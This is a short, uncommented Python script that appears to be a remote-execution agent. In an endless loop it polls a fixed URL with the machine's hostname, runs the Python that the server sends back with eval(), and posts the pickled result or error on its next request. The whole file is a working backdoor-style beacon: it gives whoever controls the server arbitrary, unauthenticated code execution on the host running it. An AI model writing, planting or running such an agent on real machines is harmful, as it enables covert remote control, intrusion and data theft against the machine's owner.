import sys
import requests
import socket
import traceback
import pickle
import time
from functools import partial

import psutil


URL = "http://localhost:8080/channel/python/pepe"
HOSTNAME = socket.gethostname()


def gather_code(last_result):
    if last_result:
        res = requests.post(
                URL,
                params={"hostname": HOSTNAME},
                data=last_result
                )
    else:
        res = requests.post(
                URL,
                params={"hostname": HOSTNAME},
                )
    return res.content

def pickle_eval(what):
    res = None
    try:
        res = eval(what)
    except Exception as ex:
        res = ex
    return pickle.dumps(res)


result = None

while True:
    prepared_request = partial(gather_code, result)
    try:
        code = prepared_request()
        result = pickle_eval(code)
    except Exception as ex:
        print("can't comunicate: ", ex)
        time.sleep(1)

